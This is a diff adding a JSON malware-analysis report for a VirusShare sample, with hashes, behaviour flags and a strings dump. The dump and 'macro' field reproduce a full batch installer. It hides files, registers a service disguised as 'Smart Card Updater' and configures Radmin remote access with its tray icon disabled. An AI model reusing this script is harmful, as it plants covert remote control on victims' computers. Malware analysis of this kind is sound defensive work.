@@ -1,0 +1,81 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "SYSTEM": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "md %windir%\\system32\\dhcp\nmove wrt.acx %windir%\\system32\\dhcp\nmove dhcpcl.exe %windir%\\system32\\dhcp\nmove scardupd.exe %windir%\\system32\nmove trkupd.exe %windir%\\system32\nattrib +h +s -r %windir%\\system32\\dhcp\nattrib +h +s -r %windir%\\system32\\dhcp\\dhcpcl.exe\nattrib +h +s -r %windir%\\system32\\dhcp\\wrt.acx\nattrib +h +s -r %windir%\\system32\\scardupd.exe\nattrib +h +s -r %windir%\\system32\\trkupd.exe\nsrv install SCardUpd /n:\"Smart Card Updater\" /b:%windir%\\system32\\scardupd.exe /u:localsystem /s:auto /i:yes\nrgv -addkey \\HKLM\\SYSTEM\\RAdmin\nrgv -addkey \\HKLM\\SYSTEM\\RAdmin\\v2.0\nrgv -addkey \\HKLM\\SYSTEM\\RAdmin\\v2.0\\Server\nrgv -addkey \\HKLM\\SYSTEM\\RAdmin\\v2.0\\Server\\Parameters\nrgv -addkey \\HKLM\\SOFTWARE\\RAdmin\nrgv -addkey \\HKLM\\SOFTWARE\\RAdmin\\v1.01\nrgv -addkey \\HKLM\\SOFTWARE\\RAdmin\\v1.01\\ViewType\nrgv -set REG_BINARY \\HKLM\\SYSTEM\\RAdmin\\v2.0\\Server\\Parameters\\DisableTrayIcon=01000000\nrgv -set REG_BINARY \\HKLM\\SYSTEM\\RAdmin\\v2.0\\Server\\Parameters\\Port=3b0d0000\nrgv -set REG_BINARY \\HKLM\\SYSTEM\\RAdmin\\v2.0\\Server\\Parameters\\Parameter=1f96e01aba9dc476eaa02fc6bab43ae6\nrgv -set REG_BINARY \\HKLM\\SOFTWARE\\RAdmin\\v1.01\\ViewType\\Data=01f699b0575c1380186ff3fc68838ebfca4a9c5eccf98e7c3172ae28315e990b9fa48961fc0ce34750e30608f0552b80b3d4c0a8153627f05f8ef7b0f5b04bdb\nrgv -set REG_EXPAND_SZ \"\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\SCardUpd\\ImagePath=%windir%\\system32\\scardupd.exe /service\"\nrgv -set REG_SZ \"\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\SCardUpd\\Description=Provides updates for legacy smart card readers attached to the computer.\"\n%windir%\\system32\\dhcp\\dhcpcl.exe -install\n%windir%\\system32\\trkupd.exe -:installonly\nsrv start dhcpcl\nsrv start scardupd\nsrv start trkupd\ndel msg.txt\ndel rgv.exe\ndel connected.exe\ndel script.vbs\ndel srv.exe\ndel install.bat"
+    },
+    "filename": "VirusShare_c9f395c8cccf7cf63bbc954a89449d52",
+    "filesize": 1794,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "c9f395c8cccf7cf63bbc954a89449d52",
+        "sha1": "0170d137c28f4b5b5e9838b1f498df91bd32ffce",
+        "sha256": "21261de16e9af851cd725892264a9035a73ff85e3019090057f638c87347e450"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "md %windir%\\system32\\dhcp",
+            "move wrt.acx %windir%\\system32\\dhcp",
+            "move dhcpcl.exe %windir%\\system32\\dhcp",
+            "move scardupd.exe %windir%\\system32",
+            "move trkupd.exe %windir%\\system32",
+            "attrib +h +s -r %windir%\\system32\\dhcp",
+            "attrib +h +s -r %windir%\\system32\\dhcp\\dhcpcl.exe",
+            "attrib +h +s -r %windir%\\system32\\dhcp\\wrt.acx",
+            "attrib +h +s -r %windir%\\system32\\scardupd.exe",
+            "attrib +h +s -r %windir%\\system32\\trkupd.exe",
+            "srv install SCardUpd /n:\"Smart Card Updater\" /b:%windir%\\system32\\scardupd.exe /u:localsystem /s:auto /i:yes",
+            "rgv -addkey \\HKLM\\SYSTEM\\RAdmin",
+            "rgv -addkey \\HKLM\\SYSTEM\\RAdmin\\v2.0",
+            "rgv -addkey \\HKLM\\SYSTEM\\RAdmin\\v2.0\\Server",
+            "rgv -addkey \\HKLM\\SYSTEM\\RAdmin\\v2.0\\Server\\Parameters",
+            "rgv -addkey \\HKLM\\SOFTWARE\\RAdmin",
+            "rgv -addkey \\HKLM\\SOFTWARE\\RAdmin\\v1.01",
+            "rgv -addkey \\HKLM\\SOFTWARE\\RAdmin\\v1.01\\ViewType",
+            "rgv -set REG_BINARY \\HKLM\\SYSTEM\\RAdmin\\v2.0\\Server\\Parameters\\DisableTrayIcon=01000000",
+            "rgv -set REG_BINARY \\HKLM\\SYSTEM\\RAdmin\\v2.0\\Server\\Parameters\\Port=3b0d0000",
+            "rgv -set REG_BINARY \\HKLM\\SYSTEM\\RAdmin\\v2.0\\Server\\Parameters\\Parameter=1f96e01aba9dc476eaa02fc6bab43ae6",
+            "rgv -set REG_BINARY \\HKLM\\SOFTWARE\\RAdmin\\v1.01\\ViewType\\Data=01f699b0575c1380186ff3fc68838ebfca4a9c5eccf98e7c3172ae28315e990b9fa48961fc0ce34750e30608f0552b80b3d4c0a8153627f05f8ef7b0f5b04bdb",
+            "rgv -set REG_EXPAND_SZ \"\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\SCardUpd\\ImagePath=%windir%\\system32\\scardupd.exe /service\"",
+            "rgv -set REG_SZ \"\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\SCardUpd\\Description=Provides updates for legacy smart card readers attached to the computer.\"",
+            "%windir%\\system32\\dhcp\\dhcpcl.exe -install",
+            "%windir%\\system32\\trkupd.exe -:installonly",
+            "srv start dhcpcl",
+            "srv start scardupd",
+            "srv start trkupd",
+            "del msg.txt",
+            "del rgv.exe",
+            "del connected.exe",
+            "del script.vbs",
+            "del srv.exe",
+            "del install.bat"
+        ],
+        "file": {
+            "attrib +h +s -r %windir%\\system32\\dhcp\\dhcpcl.exe": "Executable",
+            "attrib +h +s -r %windir%\\system32\\scardupd.exe": "Executable",
+            "attrib +h +s -r %windir%\\system32\\trkupd.exe": "Executable",
+            "del connected.exe": "Executable",
+            "del msg.txt": "Text",
+            "del rgv.exe": "Executable",
+            "del srv.exe": "Executable"
+        },
+        "fuzzing": {
+            "String too long": [
+                "rgv -set REG_BINARY \\HKLM\\SOFTWARE\\RAdmin\\v1.01\\ViewType\\Data=01f699b0575c1380186ff3fc68838ebfca4a9c5eccf98e7c3172ae28315e990b9fa48961fc0ce34750e30608f0552b80b3d4c0a8153627f05f8ef7b0f5b04bdb"
+            ]
+        },
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.311649",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
